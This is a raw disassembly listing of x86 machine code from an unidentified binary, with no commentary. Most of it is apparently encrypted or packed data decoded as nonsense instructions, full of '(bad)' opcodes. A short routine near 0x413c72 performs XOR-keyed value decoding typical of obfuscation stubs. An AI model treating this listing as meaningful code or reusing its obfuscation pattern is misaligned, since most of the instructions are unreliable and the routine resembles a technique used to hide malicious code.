  4139e8:	cwde   
  4139e9:	push   0x1b
  4139eb:	xor    DWORD PTR [edi],edi
  4139ed:	(bad)
  4139f0:	mov    edx,0x46446b58
  4139f5:	ror    BYTE PTR [ebp+0x45625ffc],cl
  4139fb:	ins    DWORD PTR es:[edi],dx
  4139fc:	shr    BYTE PTR [edx],1
  4139fe:	mov    bh,0x27
  413a00:	inc    edx
  413a01:	mov    dl,0x29
  413a03:	(bad)  
  413a04:	div    DWORD PTR [eiz*4+0x5f67d45d]
  413a0b:	(bad)  
  413a0c:	sub    ah,BYTE PTR [ecx+0x2a16362]
  413a12:	test   al,0x76
  413a14:	push   edx
  413a15:	mov    al,ds:0xc00ec29b
  413a1a:	mov    esi,0x3aa189e4
  413a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a20:	adc    BYTE PTR ss:[eax],dl
  413a23:	test   BYTE PTR [ecx],ah
  413a25:	rcl    dh,0x15
  413a28:	mov    eax,0x9de1f692
  413a2d:	nop
  413a2e:	push   esp
  413a2f:	fcom   QWORD PTR [edi-0x75]
  413a32:	xchg   esi,eax
  413a33:	shl    DWORD PTR [edx+0x37e4ae7b],0x2f
  413a3a:	in     al,dx
  413a3b:	popf   
  413a3c:	xchg   ebp,eax
  413a3d:	dec    ebx
  413a3e:	pop    ecx
  413a3f:	sbb    ch,BYTE PTR [esi]
  413a41:	in     al,0x72
  413a43:	mov    eax,ds:0x94e53f1f
  413a48:	and    edx,ebx
  413a4a:	ins    BYTE PTR es:[edi],dx
  413a4b:	jge    0x4139f1
  413a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a4f:	retf   0xb0ac
  413a52:	xchg   ecx,eax
  413a53:	mov    esp,0x2dcc1363
  413a58:	jbe    0x7373c147
  413a5e:	push   es
  413a5f:	add    DWORD PTR [eax],0x35
  413a62:	push   es
  413a63:	pop    ebx
  413a64:	ds cld 
  413a66:	or     ch,al
  413a68:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413a6a:	popf   
  413a6b:	sti    
  413a6c:	push   0x48
  413a6e:	mov    WORD PTR [ecx+0x172e07c1],?
  413a74:	ins    BYTE PTR es:[edi],dx
  413a75:	mov    edx,0x57e8283e
  413a7a:	pop    eax
  413a7b:	(bad)  
  413a7c:	fidivr WORD PTR ds:0x6462f9d1
  413a82:	jle    0x413adc
  413a84:	or     eax,0xaf591f63
  413a89:	sub    BYTE PTR [ebx],al
  413a8b:	xor    bh,ch
  413a8d:	dec    ecx
  413a8e:	or     eax,0x3f0fe309
  413a93:	aad    0xbe
  413a95:	mov    cl,0x89
  413a97:	inc    ebx
  413a98:	aaa    
  413a99:	xlat   BYTE PTR ds:[ebx]
  413a9a:	(bad)  
  413a9b:	xor    al,0xfd
  413a9d:	or     esp,DWORD PTR [ecx+0x49f75028]
  413aa3:	test   al,0xd3
  413aa5:	push   es
  413aa6:	fxch   st(1)
  413aa8:	and    ah,BYTE PTR [ecx]
  413aaa:	mov    DWORD PTR [ebx-0x6],ebx
  413aad:	inc    esp
  413aae:	daa    
  413aaf:	clc    
  413ab0:	stc    
  413ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab2:	xchg   ebp,eax
  413ab3:	sbb    dl,cl
  413ab5:	stos   DWORD PTR es:[edi],eax
  413ab6:	popa   
  413ab7:	pop    ds
  413ab8:	test   eax,0x267e9cb8
  413abd:	mov    ds:0x2142f6fb,al
  413ac2:	mov    BYTE PTR [ecx+0x3e],ah
  413ac5:	push   edx
  413ac6:	and    dl,cl
  413ac8:	dec    ebp
  413ac9:	and    al,0xda
  413acb:	cmp    al,0xfd
  413acd:	add    DWORD PTR [eax],esp
  413acf:	jno    0x413a9f
  413ad1:	mov    eax,ds:0x233ed490
  413ad6:	and    edi,DWORD PTR [ecx]
  413ad8:	retf   0x15b0
  413adb:	(bad)  
  413adc:	sar    DWORD PTR [ecx],cl
  413ade:	inc    eax
  413adf:	and    BYTE PTR [ebx],ch
  413ae1:	pushf  
  413ae2:	adc    edi,esp
  413ae4:	pushf  
  413ae5:	jno    0x413ae5
  413ae7:	nop
  413ae8:	cmp    eax,0x15f2b0fa
  413aed:	ret    
  413aee:	in     al,dx
  413aef:	shl    ch,cl
  413af1:	inc    eax
  413af2:	into   
  413af3:	or     BYTE PTR [eax],bh
  413af5:	std    
  413af6:	inc    ebp
  413af7:	pop    edx
  413af8:	add    ecx,0xaeee3e5e
  413afe:	jmp    0x413b46
  413b00:	(bad)  
  413b01:	iret   
  413b02:	sbb    al,0x17
  413b04:	mov    al,0x3b
  413b06:	cmp    DWORD PTR [ecx],esi
  413b08:	sbb    eax,0x4ee36547
  413b0d:	cmc    
  413b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b0f:	lods   eax,DWORD PTR ds:[esi]
  413b10:	adc    al,0x71
  413b12:	mov    ch,BYTE PTR [eax]
  413b14:	push   esi
  413b15:	dec    eax
  413b16:	(bad)  
  413b17:	mov    ?,WORD PTR [edi-0x6f64e1c8]
  413b1d:	rcr    DWORD PTR [ebx+0x49],cl
  413b20:	xor    DWORD PTR [edi-0x40d36fbd],0xffffffdb
  413b27:	fcom   QWORD PTR [eax-0x4be28e37]
  413b2d:	out    dx,eax
  413b2e:	mov    edi,0x2cb414f5
  413b33:	pushf  
  413b34:	xor    ch,dl
  413b36:	push   es
  413b37:	sbb    al,0x42
  413b39:	(bad)
  413b3c:	pop    es
  413b3d:	scas   eax,DWORD PTR es:[edi]
  413b3e:	sbb    eax,0x478bace7
  413b43:	into   
  413b44:	in     eax,0xaf
  413b46:	pop    eax
  413b47:	dec    edi
  413b48:	xchg   ax,ax
  413b4a:	and    DWORD PTR [ebx],0x231fbb57
  413b50:	stos   BYTE PTR es:[edi],al
  413b51:	stos   BYTE PTR es:[edi],al
  413b52:	adc    DWORD PTR [eax-0x60],edx
  413b55:	jae    0x413b57
  413b57:	dec    ebp
  413b58:	test   DWORD PTR [esi],esi
  413b5a:	enter  0x2b89,0xa9
  413b5e:	push   0x67
  413b60:	mov    cl,0xd5
  413b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b63:	loopne 0x413aef
  413b65:	pop    esi
  413b66:	sub    DWORD PTR [eax+0x6c6db704],0xfffffff9
  413b6d:	xor    al,0xe6
  413b6f:	jle    0x413b93
  413b71:	(bad)  
  413b72:	dec    edi
  413b73:	rol    BYTE PTR [ecx+0x9],cl
  413b76:	aam    0x72
  413b78:	lock (bad) 
  413b7a:	icebp  
  413b7b:	pop    eax
  413b7c:	retf   
  413b7d:	xchg   esp,eax
  413b7e:	xlat   BYTE PTR es:[ebx]
  413b80:	pusha  
  413b81:	pop    ds
  413b82:	pop    edx
  413b83:	adc    al,0x92
  413b85:	ror    esp,0xaa
  413b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b89:	repnz dec esi
  413b8b:	sub    al,0x34
  413b8d:	inc    edx
  413b8e:	xor    BYTE PTR [edx],dl
  413b90:	aas    
  413b91:	sbb    cl,dl
  413b93:	push   eax
  413b94:	ffreep st(2)
  413b96:	clc    
  413b97:	pushf  
  413b98:	out    dx,eax
  413b99:	add    BYTE PTR [edi],ah
  413b9b:	jbe    0x413b55
  413b9d:	cwde   
  413b9e:	sbb    al,0x96
  413ba0:	dec    ebp
  413ba1:	lds    ebp,FWORD PTR [eax]
  413ba3:	mov    esi,0x7b98cd41
  413ba8:	add    BYTE PTR [edx+edi*4-0x5a],ah
  413bac:	push   ebx
  413bad:	inc    esp
  413bae:	neg    ebx
  413bb0:	mov    edx,0xee089eb1
  413bb5:	or     eax,0x88bd092b
  413bba:	mov    edi,0x657b540c
  413bbf:	pop    ds
  413bc0:	xchg   ecx,ebp
  413bc2:	(bad)  
  413bc3:	out    0x2a,eax
  413bc5:	mov    dl,0x3d
  413bc7:	jo     0x413bd8
  413bc9:	mov    edx,DWORD PTR [ebx]
  413bcb:	bound  ecx,QWORD PTR [eax-0x65847d08]
  413bd1:	jns    0x413c42
  413bd3:	jl     0x413c13
  413bd5:	inc    edx
  413bd6:	daa    
  413bd7:	lods   eax,DWORD PTR ds:[esi]
  413bd8:	sub    al,BYTE PTR [ecx]
  413bda:	out    0x57,al
  413bdc:	push   cs
  413bdd:	(bad)  
  413bde:	iret   
  413bdf:	ret    
  413be0:	loop   0x413b7b
  413be2:	xchg   esi,eax
  413be3:	fisub  DWORD PTR [ebx+0x54ab5ead]
  413be9:	in     eax,0xc
  413beb:	cwde   
  413bec:	(bad)  
  413bed:	jmp    0x6be8e721
  413bf2:	or     BYTE PTR [edi-0x1c],cl
  413bf5:	jo     0x413ba6
  413bf7:	(bad)  
  413bf8:	ret    0xdfe9
  413bfb:	adc    al,0xb2
  413bfd:	jnp    0x413b9b
  413bff:	jg     0x413b88
  413c01:	mov    ah,dl
  413c03:	loope  0x413c35
  413c05:	xor    al,0x22
  413c07:	scas   al,BYTE PTR es:[edi]
  413c08:	ret    
  413c09:	or     bl,BYTE PTR [eax+esi*4+0x11a4af3a]
  413c10:	push   cs
  413c11:	push   0x5e4e742e
  413c16:	arpl   WORD PTR [ebx+0x72],ax
  413c19:	push   ebx
  413c1a:	cmc    
  413c1b:	jno    0x413be2
  413c1d:	or     ecx,edx
  413c1f:	popf   
  413c20:	es inc edi
  413c22:	jecxz  0x413bac
  413c24:	loopne 0x413be6
  413c26:	cmp    ebx,DWORD PTR [esp+esi*2]
  413c29:	inc    esi
  413c2a:	jmp    0x413bc2
  413c2c:	xor    edi,ebx
  413c2e:	mov    esp,0x35ed4ac7
  413c33:	inc    edi
  413c34:	sub    ebp,ebp
  413c36:	lds    ecx,FWORD PTR [ebp+0x4e]
  413c39:	push   edx
  413c3a:	mov    esi,0x76b0d58d
  413c3f:	jns    0x413c6e
  413c41:	int    0x89
  413c43:	xchg   esp,eax
  413c44:	sub    DWORD PTR [edx-0x13],0xf7afb2d3
  413c4b:	mov    BYTE PTR [ebx+0x75],ch
  413c4e:	gs (bad) 
  413c50:	(bad)  
  413c52:	sub    ebp,esi
  413c54:	mov    cl,0x98
  413c56:	and    eax,0xe62bb3c6
  413c5b:	sahf   
  413c5c:	mov    al,0x67
  413c5e:	fdiv   QWORD PTR [edx-0x28]
  413c61:	jecxz  0x413c9e
  413c63:	push   ds
  413c64:	hlt    
  413c65:	out    dx,al
  413c66:	cmp    esp,DWORD PTR [ebx-0x69]
  413c69:	(bad)  
  413c6b:	dec    edx
  413c6c:	je     0x41609c
  413c72:	mov    DWORD PTR [ebp-0x20],0x0
  413c79:	push   0x3
  413c7b:	xor    edx,edx
  413c7d:	pop    edx
  413c7e:	add    edx,0x8
  413c81:	push   edx
  413c82:	pop    ecx
  413c83:	push   0x6
  413c85:	dec    ecx
  413c86:	pop    ebx
  413c87:	dec    ebx
  413c88:	xchg   ebx,ecx
  413c8a:	sub    ebx,ecx
  413c8c:	xchg   ebx,ecx
  413c8e:	dec    ecx
  413c8f:	mov    eax,DWORD PTR [ebp-0x1c]
  413c92:	imul   eax,ecx
  413c95:	sub    esp,eax
  413c97:	mov    DWORD PTR [ebp-0x20],esp
  413c9a:	mov    eax,DWORD PTR [ebp-0x4]
  413c9d:	xor    eax,esi
  413c9f:	add    eax,edi
  413ca1:	jmp    0x416075
  413ca6:	mov    ecx,DWORD PTR [ebp-0xc]
  413ca9:	mov    eax,DWORD PTR [ebp+0x8]
  413cac:	mov    edx,DWORD PTR [ebp+0x14]
  413caf:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  413cb3:	xor    ecx,esi
  413cb5:	add    ecx,edi
  413cb7:	xor    edx,edx
  413cb9:	div    ecx
  413cbb:	mov    ecx,DWORD PTR [ebp-0x4]
  413cbe:	xor    ecx,esi
  413cc0:	lea    eax,[ecx+eax*1+0x3272ec]
  413cc7:	mov    ecx,DWORD PTR [ebp+0x8]
  413cca:	mov    edx,DWORD PTR [ebp-0x20]
  413ccd:	mov    DWORD PTR [edx+ecx*4],eax
  413cd0:	mov    eax,DWORD PTR [ebp-0xc]
  413cd3:	jmp    0x416069
  413cd8:	pop    es
  413cd9:	adc    al,0xab
  413cdb:	test   DWORD PTR [ebx+0x6a94fb79],ebx
  413ce1:	fadd   DWORD PTR [edx-0x36]
  413ce4:	add    DWORD PTR [ecx-0x46],esp
  413ce7:	test   eax,0x7a7d64d0
  413cec:	add    eax,0x7a7a5f
  413cf1:	das    
  413cf2:	mov    dl,0x4b
  413cf4:	cmp    DWORD PTR [ebp-0x12],ebp
  413cf7:	sub    al,0x61
  413cf9:	repz jmp 0x413d23
  413cfc:	cmp    BYTE PTR [edx+0x6f],dh
  413cff:	adc    ecx,DWORD PTR [ebp+0x6f]
  413d02:	mov    esi,0xfc0d5519
  413d07:	mov    cl,0x1f
  413d09:	add    ah,BYTE PTR [edx+0x3f930038]
  413d0f:	mov    eax,0x83d6d5bd
  413d14:	jmp    0xcff1e387
  413d19:	push   ecx
  413d1a:	or     eax,0x7e2c6fea
  413d1f:	mov    bh,0x15
  413d21:	cmp    BYTE PTR [edi-0x188f228c],0xba
  413d28:	mov    DWORD PTR [edx],0x4c4b56c4
  413d2e:	pop    eax
  413d2f:	sahf   
  413d30:	inc    edi
  413d31:	sub    al,0x8c
  413d33:	jl     0x413cde
  413d35:	ja     0x413cce
  413d37:	shld   DWORD PTR [eax+eiz*2+0x23],ecx,cl
  413d3c:	idiv   BYTE PTR [edx]
  413d3e:	add    al,0x7a
  413d40:	outs   dx,BYTE PTR ds:[esi]
  413d41:	pop    ebp
  413d42:	jp     0x413d9c
  413d44:	adc    al,0x1d
  413d46:	je     0x413d75
  413d48:	test   DWORD PTR ds:0xe4b722c2,edi
  413d4e:	mov    esi,ds
  413d50:	retf   0xe0ea
  413d53:	out    0x1d,eax
  413d55:	mov    ch,0xe1
  413d57:	mov    al,ds:0x888fd628
  413d5c:	pop    edi
  413d5d:	lods   eax,DWORD PTR ds:[esi]
  413d5e:	or     BYTE PTR [ebx-0x5f],bh
  413d61:	adc    bh,ch
  413d63:	mov    edi,0x22d5b84e
  413d68:	aaa    
  413d69:	jbe    0x413d7b
  413d6b:	je     0x413d53
  413d6d:	dec    ebp
  413d6e:	push   0x7
  413d70:	xor    dh,BYTE PTR ds:0x938f0cc2
  413d76:	fst    QWORD PTR [edi+0x3fe5a807]
  413d7c:	xchg   edx,eax
  413d7d:	leave  
  413d7e:	jb     0x413dc0
  413d80:	cmp    eax,0x8c61109f
  413d85:	scas   eax,DWORD PTR es:[edi]
  413d86:	stos   DWORD PTR es:[edi],eax
  413d87:	cdq    
  413d88:	aas    
  413d89:	push   0x951a33d3
  413d8e:	test   al,0xe9
  413d90:	dec    ebp
  413d91:	lock setns BYTE PTR [eax+0x7e711b85]
  413d99:	(bad)  
  413d9a:	gs push 0x866ce7f3
  413da0:	and    eax,0xd6ab669c
  413da5:	je     0x413d78
  413da7:	cmc    
  413da8:	dec    eax
  413da9:	jmp    0x6ec9b44e
  413dae:	in     eax,0xaa
  413db0:	mov    es,WORD PTR [ebx+0x4a014837]
  413db6:	sahf   
  413db7:	imul   esi,DWORD PTR [edi],0xcc9fde3c
  413dbd:	in     al,0x4c
  413dbf:	mov    ecx,0x88da9099
  413dc4:	loopne 0x413dd1
  413dc6:	in     al,0xce
  413dc8:	loop   0x413e42
  413dca:	inc    ecx
  413dcb:	mov    bl,0xe0
  413dcd:	lods   al,BYTE PTR ds:[esi]
  413dce:	or     al,0x5f
  413dd0:	adc    eax,edx
  413dd2:	lahf   
  413dd3:	in     eax,dx
  413dd4:	cs dec ebp
  413dd6:	cwde   
  413dd7:	out    dx,eax
  413dd8:	stos   BYTE PTR es:[edi],al
  413dd9:	ret    
  413dda:	inc    edx
  413ddb:	dec    esp
  413ddc:	adc    al,0x3a
  413dde:	mov    ds:0x519125f6,al
  413de3:	mov    al,ds:0x94aab92
  413de8:	jle    0x413d72
  413dea:	jecxz  0x413db9
  413dec:	fsub   QWORD PTR [eax+0x429309f3]
  413df2:	xchg   esp,eax
  413df3:	outs   dx,BYTE PTR ds:[esi]
  413df4:	je     0x413dc8
  413df6:	cmp    eax,DWORD PTR [esp+eax*1-0x33]
  413dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dfb:	push   edi
  413dfc:	sub    BYTE PTR [ebp-0x26907867],ch
  413e02:	mov    al,ds:0x4880dd58
  413e07:	lock stos BYTE PTR es:[edi],al
  413e09:	and    eax,0xe096a991
  413e0e:	fs (bad) 
  413e10:	push   cs
  413e11:	jno    0x413e3d
  413e13:	fwait
  413e14:	ret    
  413e15:	xchg   esi,eax
  413e16:	pop    ds
  413e17:	out    0x6c,al
  413e19:	sbb    al,0x71
  413e1b:	inc    ecx
  413e1c:	daa    
  413e1d:	pop    esp
  413e1e:	das    
  413e1f:	add    dh,BYTE PTR [edi-0x2cc78082]
  413e25:	in     al,dx
  413e26:	lahf   
  413e27:	xor    eax,0xdb969e8b
  413e2c:	xchg   esp,eax
  413e2d:	jns    0x413e2c
  413e2f:	test   esi,0x1d4d35d5
  413e35:	shl    BYTE PTR [esi],cl
  413e37:	arpl   WORD PTR [edi],bx
  413e39:	push   es
  413e3a:	adc    ebp,DWORD PTR [ebp-0x27]
  413e3d:	gs jnp 0x413eab
  413e40:	cmp    BYTE PTR [edx-0x61ac0c34],bh
  413e46:	mov    edi,0x964db93b
  413e4b:	jns    0x413dfc
  413e4d:	dec    edi
  413e4e:	inc    ebx
  413e4f:	ficom  DWORD PTR [ecx+0x2]
  413e52:	mov    edi,esp
  413e54:	das    
  413e55:	mov    eax,0x26ea3650
  413e5a:	cmc    
  413e5b:	repz sbb eax,0xf1d010db
  413e61:	sti    
  413e62:	(bad)  
  413e63:	mov    esi,0x6d2846c8
  413e68:	(bad)  
  413e69:	dec    esp
  413e6a:	dec    ebp
  413e6b:	or     al,0x8
  413e6d:	and    DWORD PTR [esi-0x4f299c4a],ecx
  413e73:	jmp    0x413e3b
  413e75:	leave  
  413e76:	mov    ebx,0xc5c67dc3
  413e7b:	aaa    
  413e7c:	repnz mov ds:0xd74793cb,eax
  413e82:	and    bl,BYTE PTR [eax+0x68b1783b]
  413e88:	xor    ecx,DWORD PTR [ebp+0x2c]
  413e8b:	inc    eax
  413e8c:	test   eax,0xec52d24c
  413e91:	xchg   esp,eax
  413e92:	call   0xc40842b5
  413e97:	xchg   esi,eax
  413e98:	inc    eax
  413e99:	push   ds
  413e9a:	mov    BYTE PTR [ecx-0x21],dl
  413e9d:	inc    ebx
  413e9e:	and    esp,DWORD PTR [edx+0x36e84d62]
  413ea4:	pop    esi
  413ea5:	repnz push eax
  413ea7:	mov    ecx,0xe364ec6
  413eac:	jg     0x413efe
  413eae:	cli    
  413eaf:	mov    edx,0xdb83da50
  413eb4:	adc    al,0xda
  413eb6:	sub    esp,DWORD PTR [esi*4-0x1e3b051e]
  413ebd:	cld    
  413ebe:	push   ds
  413ebf:	stos   BYTE PTR es:[edi],al
  413ec0:	stos   BYTE PTR es:[edi],al
  413ec1:	(bad)  
  413ec2:	or     esp,DWORD PTR [eax+0x4efa7efc]
  413ec8:	pop    ebx
  413ec9:	fcmovb st,st(4)
  413ecb:	lods   eax,DWORD PTR ds:[esi]
  413ecc:	sub    al,0x2a
  413ece:	dec    ebx
  413ecf:	push   edx
  413ed0:	call   DWORD PTR fs:[edx]
  413ed3:	aad    0xc0
  413ed5:	aad    0x6c
  413ed7:	xchg   ecx,eax
  413ed8:	jp     0x413f3f
  413eda:	or     cl,BYTE PTR cs:[ecx+ebx*4-0xd]
  413edf:	inc    eax
  413ee0:	sti    
  413ee1:	add    al,0x56
  413ee3:	mov    eax,0x3db989d9
  413ee8:	addr16 loope 0x413ea2
  413eeb:	and    edi,DWORD PTR [edx+0x5865ef4f]
  413ef1:	or     al,dh
  413ef3:	repz dec edi
  413ef5:	ficom  WORD PTR [edi-0x15]
  413ef8:	sub    esp,0x749732ba
  413efe:	cmp    bl,bh
  413f00:	(bad)  
  413f01:	dec    esp
  413f02:	push   cs
  413f03:	adc    BYTE PTR [ebp-0xb],cl
  413f06:	mov    cl,0xaf
  413f08:	cwde   
  413f09:	mov    bh,0x2d
  413f0b:	inc    edx
  413f0c:	cmp    edx,DWORD PTR [ebx]
  413f0e:	fbld   TBYTE PTR [edx]
  413f10:	hlt    
  413f11:	and    ebx,ecx
  413f13:	jmp    0x413f94
  413f15:	jg     0x413f2b
  413f17:	xchg   edx,eax
  413f18:	xchg   edx,esp
  413f1a:	mov    ebx,0xe0f5cb24
  413f1f:	and    ebx,DWORD PTR [ebx+ebx*1-0x3ff95361]
  413f26:	adc    eax,esi
  413f28:	or     DWORD PTR [esi+0x64495855],ebx
  413f2e:	mov    edx,0x357e1ed8
  413f33:	out    dx,al
  413f34:	add    BYTE PTR [edx],dl
  413f36:	mov    eax,DWORD PTR [ebp-0x41f06cc7]
  413f3c:	xlat   BYTE PTR ds:[ebx]
  413f3d:	pushf  
  413f3e:	pop    edx
  413f3f:	imul   ebx,DWORD PTR [ebp+0x35],0x8bd83868
  413f46:	(bad)
  413f49:	ins    BYTE PTR es:[edi],dx
  413f4a:	adc    eax,0x7022891d
  413f4f:	cs xchg ecx,eax
  413f51:	mov    ebx,0x571f3ef7
  413f56:	sqrtps xmm1,xmm6
  413f59:	imul   edi,DWORD PTR [ecx],0x2e6cd5ae
  413f5f:	ja     0x413f1b
  413f61:	add    DWORD PTR [eax-0x6c22454],0xffffffa1
  413f68:	loop   0x413fc8
  413f6a:	pop    esp
  413f6b:	jns    0x413f72
  413f6d:	mov    BYTE PTR [ebx+0x76b3ebb6],ah
  413f73:	adc    al,0x65
  413f75:	dec    edi
  413f76:	imul   edx,eax,0xf61f3524
  413f7c:	stos   DWORD PTR es:[edi],eax
  413f7d:	cli    
  413f7e:	push   DWORD PTR [eax+0x48]
  413f81:	(bad)  
  413f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f83:	or     cl,cl
  413f85:	in     al,dx
  413f86:	pop    edi
  413f87:	inc    ebp
  413f88:	mov    eax,0xc4370863
  413f8d:	jecxz  0x413f96
  413f8f:	fs cmc 
  413f91:	fscale 
  413f93:	imul   edx,DWORD PTR [ebx+0x56],0x2a9fe260
  413f9a:	outs   dx,DWORD PTR ds:[esi]
  413f9b:	jg     0x413f24
  413f9d:	test   BYTE PTR [ecx],bh
  413f9f:	or     BYTE PTR ds:0x563360f1,0x95
  413fa6:	cmovbe eax,DWORD PTR ds:0x2186bc51
  413fad:	push   edx
  413fae:	mov    ds:0xc2cac732,al
  413fb3:	stos   DWORD PTR es:[edi],eax
  413fb4:	sbb    ah,BYTE PTR [esi]
  413fb6:	les    eax,FWORD PTR [ebx+0x6fccf3bf]
  413fbc:	push   ebp
  413fbd:	icebp  
  413fbe:	xchg   BYTE PTR [edx-0x70],dl
  413fc1:	adc    DWORD PTR [ecx-0x6f],esi
  413fc4:	xor    ebx,ebx
  413fc6:	pop    ds
  413fc7:	into   
  413fc8:	jns    0x413fdd
  413fca:	out    0x69,eax
  413fcc:	adc    ch,dh
  413fce:	aaa    
  413fcf:	sub    bh,BYTE PTR [ebx-0x7db88d0f]
  413fd5:	outs   dx,BYTE PTR ds:[esi]
  413fd6:	fsub   DWORD PTR ds:0x759fe535
  413fdc:	push   es
  413fdd:	jns    0x413ffc
  413fdf:	jnp    0x413fbf
  413fe1:	jg     0x414039
  413fe3:	lods   al,BYTE PTR ds:[esi]
  413fe4:	jbe    0x413fe6
  413fe6:	inc    esp
  413fe7:	push   ebp
  413fe8:	ins    BYTE PTR es:[edi],dx
  413fe9:	xor    bh,BYTE PTR [edi]
  413feb:	or     dh,bl
  413fed:	retf   
  413fee:	les    edx,FWORD PTR [ecx+0x44ad5c67]
  413ff4:	in     eax,0x17
  413ff6:	inc    esp
  413ff7:	enter  0xf80c,0x5c
  413ffb:	fwait
  413ffc:	popf   
  413ffd:	mov    eax,ds:0x8924dfe1
  414002:	in     al,dx
  414003:	stos   BYTE PTR es:[edi],al
  414004:	test   eax,0x42ec7e36
  414009:	xchg   DWORD PTR [ebx-0x40],edi
  41400c:	xor    al,0x9
  41400e:	iret   
  41400f:	cli    
  414010:	mov    al,ds:0x3fcf99e1
  414015:	mov    cl,cl
  414017:	jg     0x413fe3
  414019:	test   BYTE PTR [ebx+0x61],cl
  41401c:	ret    0x4658
  41401f:	ds scas al,BYTE PTR es:[edi]
  414021:	jne    0x414009
  414023:	icebp  
  414024:	sub    DWORD PTR [ebp+0x37],0x2
  414028:	sahf   
  414029:	or     esp,edx
  41402b:	pop    es
  41402c:	pusha  
  41402d:	mov    esi,0xaf40341e
  414032:	nop
  414033:	(bad)  
  414034:	leave  
  414035:	nop
  414036:	jno    0x4140af
  414038:	jge    0x414048
  41403a:	cmp    eax,0x9c67255e
  41403f:	cdq    
  414040:	int    0x2a
  414042:	in     eax,0x57
  414044:	(bad)  
  414045:	jnp    0x414043
  414047:	inc    ecx
  414048:	pop    ds
  414049:	das    
  41404a:	scas   al,BYTE PTR es:[edi]
  41404b:	cmp    dh,BYTE PTR [esi+0x20]
  41404e:	lock mov eax,0x4aa49122
  414054:	ffreep st(5)
  414056:	ins    BYTE PTR es:[edi],dx
  414057:	call   0xfdf4:0x9124019a
  41405e:	adc    BYTE PTR [esi-0x58],0x31
  414062:	leave  
  414063:	imul   ebp,DWORD PTR [ebx],0xcf5431e0
  414069:	xlat   BYTE PTR ds:[ebx]
  41406a:	mov    dh,0xad
  41406c:	ret    
  41406d:	sub    BYTE PTR [edx],al
  41406f:	inc    edx
  414070:	mov    al,ds:0x66d41005
  414075:	popa   
  414076:	cld    
  414077:	ds push cs
  414079:	cs ins BYTE PTR es:[edi],dx
  41407b:	xor    eax,0x6333f314
  414080:	pushf  
  414081:	sub    DWORD PTR [esi-0x798b160a],eax
  414087:	mov    cl,0xda
  414089:	int3   
  41408a:	dec    eax
  41408b:	mov    ecx,0xa71598de
  414090:	adc    al,ah
  414092:	pop    esi
  414093:	popf   
  414094:	std    
  414095:	pop    edx
  414096:	jo     0x4140e9
  414098:	push   0xffffffd3
  41409a:	popa   
  41409b:	scas   eax,DWORD PTR es:[edi]
  41409c:	int    0xd6
  41409e:	fwait
  41409f:	push   esp
  4140a0:	cmp    eax,0xa12102c4
  4140a5:	scas   al,BYTE PTR es:[edi]
  4140a6:	loope  0x4140a7
  4140a8:	jg     0x41409c
  4140aa:	nop
  4140ab:	cmp    al,0xda
  4140ad:	mov    ebp,0x3127aa3e
  4140b2:	mov    eax,0x3e875b56
  4140b7:	cmp    DWORD PTR [edi+0x40],0xbba210cd
  4140be:	jne    0x4140dc
  4140c0:	imul   edi,DWORD PTR [ecx-0x4d],0x14
  4140c4:	outs   dx,BYTE PTR ds:[esi]
  4140c5:	js     0x4140e3
  4140c7:	jns    0x41407f
  4140c9:	rcl    DWORD PTR [ebp-0x61],1
  4140cc:	and    edx,DWORD PTR [edx+0x1da78729]
  4140d2:	pop    ebx
  4140d3:	or     BYTE PTR ds:0xd6da211f,dl
  4140d9:	sahf   
  4140da:	inc    edi
  4140db:	jns    0x414105
  4140dd:	(bad)  
  4140de:	mov    ecx,0x4ff4c2c4
  4140e3:	push   ebx
  4140e4:	rol    al,cl
  4140e6:	jmp    0xb4f84130
  4140eb:	or     DWORD PTR [ebx-0x7e],esi
  4140ee:	sbb    ecx,ebx
  4140f0:	ja     0x4140dc
  4140f2:	inc    esp
  4140f3:	sub    edi,DWORD PTR [ecx+0x78]
  4140f6:	or     esi,DWORD PTR [ebx+0x5ed9d502]
  4140fc:	mov    ch,0x94
  4140fe:	or     esp,eax
  414100:	dec    ecx
  414101:	call   0x7abe:0xfdbf8021
  414108:	rol    BYTE PTR [eax],cl
  41410a:	into   
  41410b:	xor    edi,edx
  41410d:	aaa    
  41410e:	loop   0x4140ea
  414110:	xor    cl,BYTE PTR [ebp+0x4]
  414113:	xor    eax,0xbcfc48dd
  414118:	adc    BYTE PTR [edx-0x20ee844a],0xdd
  41411f:	add    al,0x37
  414121:	sbb    eax,0xac462cfe
  414126:	ffreep st(7)
  414128:	mov    edx,0x57209eb5
  41412d:	xor    eax,0x88f2de63
  414132:	dec    ebx
  414133:	ja     0x4140ef
  414135:	test   BYTE PTR [edi+0x71],0xb0
  414139:	push   0xffffffe3
  41413b:	stos   BYTE PTR es:[edi],al
  41413c:	add    BYTE PTR [ecx],bl
  41413e:	pop    es
  41413f:	push   cs
  414140:	jmp    0x4141bc
  414142:	cmp    edx,0xeb226280
  414148:	or     DWORD PTR [ecx],0xffffffbe
  41414b:	aam    0x5b
  41414d:	and    al,BYTE PTR ds:0x4c1cbca1
  414153:	aaa    
  414154:	stos   DWORD PTR es:[edi],eax
  414155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414156:	jecxz  0x414124
  414158:	mov    ds:0xf788af66,al
  41415d:	les    ecx,FWORD PTR [eax+0xb]
  414160:	in     eax,0x94
  414162:	out    0x1,eax
  414164:	out    0x6b,al
  414166:	inc    esp
  414167:	mov    ebx,0x493c2c07
  41416c:	xchg   DWORD PTR [ecx-0xf],esi
  41416f:	push   edx
  414170:	dec    edi
  414171:	call   0xa2d96520
  414176:	push   cs
  414177:	and    al,bh
  414179:	mov    ch,0xd5
  41417b:	add    eax,0x1f35f556
  414180:	nop
  414181:	mov    esi,0xc3be9cd5
  414186:	jns    0x4141a9
  414188:	pop    edi
  414189:	sar    BYTE PTR [ecx],0x88
  41418c:	inc    esi
  41418d:	jl     0x4141c0
  41418f:	or     esp,DWORD PTR [ebp+0x5e]
  414192:	cmp    BYTE PTR [eax+0x53],ch
